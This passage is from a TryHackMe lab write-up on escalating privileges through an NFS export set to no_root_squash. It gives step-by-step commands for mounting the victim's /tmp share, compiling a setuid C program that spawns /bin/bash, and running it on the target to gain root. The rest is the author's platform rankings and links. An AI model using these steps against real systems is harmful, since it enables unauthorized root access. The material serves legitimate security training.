2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.</p>

<h3>Exploitation</h3>

<p>Attacker VM<br>

1. Open command prompt and type: <code>showmount -e 10.10.223.247</code><br>
2. In command prompt type: <code>mkdir /tmp/1</code><br>
3. In command prompt type: <code>mount -o rw,vers=2 10.10.223.247:/tmp /tmp/1</code><br>
In command prompt type: <code>echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c</code><br>
4. In command prompt type: <code>gcc /tmp/1/x.c -o /tmp/1/x</code><br>
5. In command prompt type: <code>chmod +s /tmp/1/x</code></p>

<p>Linux VM<br>

1. In command prompt type: <code>/tmp/x</code><br>
2. In command prompt type: <code>id</code></p>

<h3 align="left">Answer the question below</h3>

> 19.1. <em>Click 'Completed' once you have successfully elevated the machine</em><br><a id='19.1'></a>
>> <strong><code>No answer needed</code></strong><br>

![image](https://github.com/user-attachments/assets/58b4a80a-f866-4a31-91c7-1a56cd4c7f4c)

![image](https://github.com/user-attachments/assets/01c6fa95-c7f2-4dec-a2c7-d7934b2a8410)

![image](https://github.com/user-attachments/assets/5c1872fb-e1d3-4991-a4e6-5abc64a0860b)

<br>
<br>

<h1 align="center">Room Completed</h1>
<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/17bed83c-0760-4f0c-95f2-31e860569009"><br>
<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/bedeaea0-73a7-44cc-a7f9-de63a903fd8d"></p>
                   
<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date<br>          |  Streak<br>|   All Time<br>Global   |   All Time<br>Brazil |  Monthly<br>Global   |  Monthly<br>Brazil   |  SHOGUN<br>points  |   Rooms<br>completed  |  Badges<br> |
| :---------------: | :--------: | :--------------------: | :------------------: | :------------------: | :------------------: | :----------------: | :-------------------: | :---------: |
| Jun 7, 2025       |     396    |          201ˢᵗ         |            4ᵗʰ       |        1,144ᵗʰ       |         17ᵗʰ         |       106,675      |             767      |    62       |

</div>

<p align="center"> Global All Time: 201ˢᵗ <br><img width="300px" src="https://github.com/user-attachments/assets/fcb20c7e-47a5-46e5-97f9-396a36a21aec" alt="Your Image Badge"><br>
                                              <img width="1000px" src="https://github.com/user-attachments/assets/79a6d9d8-a55d-4247-811c-d155118f42e2"><br><br>
                   Brazil All Time:   4ᵗʰ<br><img width="1000px" src="https://github.com/user-attachments/assets/da85e450-b4a9-42cc-a5d4-89ea18067145"><br><br>
                   Global monthly: 1,144ᵗʰ<br><img width="1000px" src="https://github.com/user-attachments/assets/e0120149-ea55-4ef2-9403-18546998d216"><br><br>
                   Brazil monthly:   17ᵗʰ<br><img width="1000px" src="https://github.com/user-attachments/assets/b1d0fd6a-c419-4fbe-b1a3-ba8e390afc37"><br><br></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
<br><br>
<h1 align="center">Thank you very much TCM for developinng this experience so that I could sharpen my skills!</h1>
